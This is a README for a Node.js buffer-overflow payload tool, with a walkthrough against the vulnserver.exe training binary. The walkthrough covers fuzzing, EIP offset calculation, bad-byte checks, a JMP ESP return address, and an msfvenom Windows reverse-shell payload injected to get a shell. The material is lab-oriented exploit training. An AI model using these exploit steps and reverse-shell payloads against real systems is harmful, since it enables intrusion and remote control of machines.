# Injector

This is a tool to aid with Buffer Overflow (BOF) exploitation.

Particularly if you are following along with scenarios presented by this guide:

- YouTube: [Buffer Overflows Made Easy](https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G) by The Cyber Mentor
- Windows binary: [vulnserver.exe](http://thegreycorner.com/2010/12/15/introducing-vulnserver.html)

Related tools:
- [Microsoft Windows 10 (64-bit) Virtual Machine](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
- [x64dbg](https://x64dbg.com/)

The example invocations below are presented with the above scenario in mind.

## Use

```
# get help
$ node injector.mjs --help

Usage: node injector.mjs [options]

Options:
  --host, -h      hostname
  --port, -p      port
  --pre           cmd prefix
  --suf           cmd suffix
  --end           line ending (ie. "\r\n")
  --length, -l    overflow length to begin with
  --inc, -i       increment overflow by this each round
  --sleep         time to wait between rounds, in milliseconds
                    (default: 1000)
  --pattern, -P   one of: a|ab|nr|bad|shellcode|nop
                    where:
                      a = AAAA...
                      b = AAAA...BBBB
                      nr = Aa0Aa1...
                      bad = \x00\x01\x02...
                      shellcode = bytes provided on cli
                      nop = 909090...
  --filter, -f    list bytes, as one string, to filter from bad byte sequence
  --calc          position in pattern to calculate length based on
  --python        output to stdout in python format
  --count, -c     number of times to loop before exiting. -1=infinity
                    (default: 1)
  --ret, -r       return address (will be reversed for little-endian)
  --shellcode     shellcode in hexadecimal
  --nopsled, -n   length of nopsled in bytes
  --nopprefix     NOPs before payload
  --nopsuffix     more bytes appended to very end
```

## Philosophy

There are two modes it can operate in. By default you will receive the buffer in the standard output stream. Alternatively, when you provide `--host` and `--port` parameters, it will attempt to connect and transmit the buffer directly to the vulnerable service, like `echo` piped to netcat `nc` would.

```bash
# output an increasingly longer sequence of the given pattern
# (ie. find approximate overflow length which crashes vulnerable process)
$ node injector.mjs --pattern a --pre "MYCMD " --suf "\n" --length 3 --inc 7 --count 11 --sleep 1000
```
```
MYCMD AAA
MYCMD AAAAAAAAAA
MYCMD AAAAAAAAAAAAAAAAA
MYCMD AAAAAAAAAAAAAAAAAAAAAAAA
MYCMD AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
MYCMD AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
MYCMD AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
MYCMD AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
MYCMD AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
MYCMD AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
MYCMD AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
- **NOTICE:** omitting `--length` would cause it to begin at a length of 0.
- **NOTICE:** omitting `--inc` would cause it to increment length by 1 reach round.
- **NOTICE:** setting `--count -1` would cause it continue incrementing until killed.
- **NOTICE:** `--pre` and `--suf` are optional based on target application's expectations.
- **NOTICE:** `--pattern ab` is the same thing, except the last 4 bytes will be `BBBB` (ie. to validate overflow alignment with EIP)

```bash
# output the bad bytes pattern at a length of 256 bytes, omitting bytes 00 and 03,
# NOTICE: the pattern will repeat to fill the requested length.
$ node injector.mjs --pattern bad --length 256 --filter "\x00\x03" | xxd
```
```
00000000: 0102 0405 0607 0809 0a0b 0c0d 0e0f 1011  ................
00000010: 1213 1415 1617 1819 1a1b 1c1d 1e1f 2021  .............. !
00000020: 2223 2425 2627 2829 2a2b 2c2d 2e2f 3031  "#$%&'()*+,-./01
00000030: 3233 3435 3637 3839 3a3b 3c3d 3e3f 4041  23456789:;<=>?@A
00000040: 4243 4445 4647 4849 4a4b 4c4d 4e4f 5051  BCDEFGHIJKLMNOPQ
00000050: 5253 5455 5657 5859 5a5b 5c5d 5e5f 6061  RSTUVWXYZ[\]^_`a
00000060: 6263 6465 6667 6869 6a6b 6c6d 6e6f 7071  bcdefghijklmnopq
00000070: 7273 7475 7677 7879 7a7b 7c7d 7e7f 8081  rstuvwxyz{|}~...
00000080: 8283 8485 8687 8889 8a8b 8c8d 8e8f 9091  ................
00000090: 9293 9495 9697 9899 9a9b 9c9d 9e9f a0a1  ................
000000a0: a2a3 a4a5 a6a7 a8a9 aaab acad aeaf b0b1  ................
000000b0: b2b3 b4b5 b6b7 b8b9 babb bcbd bebf c0c1  ................
000000c0: c2c3 c4c5 c6c7 c8c9 cacb cccd cecf d0d1  ................
000000d0: d2d3 d4d5 d6d7 d8d9 dadb dcdd dedf e0e1  ................
000000e0: e2e3 e4e5 e6e7 e8e9 eaeb eced eeef f0f1  ................
000000f0: f2f3 f4f5 f6f7 f8f9 fafb fcfd feff 0102  ................
```

```bash
# output a non-repeating pattern of given length
# (e.g., similar to UV colormap in shader debugging)
# provides ability to measure memory layout with precision
$ node injector.mjs --pattern nr --length 333
```
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0
```

```bash
# take a given sequence of the pattern bytes found in memory (ie. in hexidecimal)
# and calculate its offset
# (ie. if we take the pattern found in EIP bytes, we get the length of the buffer)
$ node injector.mjs --calc 386F4337

offset at 386F4337 is 2003 bytes.
please specify pattern.
```
- **NOTICE:** The `--calc` bytes get reversed, so you don't have to convert little-endianness. Just copy-paste what you see in your debugger.


## Example Guide Walkthrough

If you follow the guide linked above, these commands would work.

```bash
# 1. confirm user input overflow causes crash.
$ export PRE="TRUN /.:/"
$ node injector.mjs --host 127.0.0.1 --port 9999 --pattern nr --pre $PRE --length 10000
# it does.
# we take the EIP `386F4337`
# we restart debugger and vulnerable process
```

```bash
# 2. (optional) verify the return address becomes EIP (BBBB)
$ node injector.mjs --host 127.0.0.1 --port 9999 --pattern ab --pre $PRE --calc 386F4337
# it aligns perfectly
# we restart debugger and vulnerable process
```

```bash
# 3. (recommended) send all possible bytes, in order to verify whether any are considered bad
$ node injector.mjs --host 127.0.0.1 --port 9999 --pattern bad --filter "\x00" --pre $PRE --calc 386F4337
# it looks like these bytes were missing:
# \x04\x05\x3b\x3c\x47\x48\x4a\x4b\xb9\xba
# we restart debugger and vulnerable process
```

4. Use `mona.py` to locate an address that is already loaded into memory with the assembly instructions we want our EIP return to point to. (ie. a `FF E4` `JMP ESP` instruction)
5. Set a breakpoint at that address in the debugger.

```bash
# 6. (optional) verify program jumps to our breakpoint
$ node injector.mjs --host 127.0.0.1 --port 9999 --pattern ab --pre $PRE --calc 386F4337 --ret 625011AF
# indeed, we've caught our breakpoint
# we restart debugger and vulnerable process
```

```bash
# 7. generate reverse shell code
$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 EXITFUNC=thread -f hex -b "\x04\x05\x3b\x3c\x47\x48\x4a\x4b\xb9\xba"
Payload size: 348 bytes
$ export SHELLCODE=33c983e9afe8ffffffffc05e81760...
```

8. We prepare to receive our reverse shell with our preferred multi-handler listener. (In my case, [`ncmdr`](https://github.com/mikesmullin/ncmdr))

```bash
# 9. inject shellcode (8 nop bytes was lower end required, but 32 is safer if you have room)
$ node injector.mjs --host 127.0.0.1 --port 9999 --pattern shellcode --pre $PRE --calc 386F4337 --ret 625011AF --nopsled 32 --shellcode $SHELLCODE
```

10. Shell is received.

## Future Ideas

The intention is for the tool to be capable of all variety of configurations for concatenating buffer overflows and shellcode, to meet any scenario. Of course, an extreme example of a tool that already does this is an assembler like NASM. But we're trying to make it easier than writing assembly code, by tying together patterns and a simple templating language.

It might be easier to take an `ffuf` approach by specifying a string or file input from disk and doing a string replacement on it (ie. `FUZZ` or `W1` etc.).

In some cases the shellcode goes at the end, and in some cases you want it at the front. In some cases you may want to add inbetween instructions for `JMP`ing back and forth, depending on what instructions you have to exploit in linked libraries. These edge cases are currently a tad too tricky. What I currently do is use this tool to get close, then output in `\x00\x01` (ie. `--python`) format, take it into `vscode`, and manipulate the bytes manually from there. But it would be nice if this tool could do it all for you with a few simple command-line arguments.

A future version of this tool might be translated into `golang` so it is portable and doesn't require an interpreter (ie. `nodejs`) to be installed.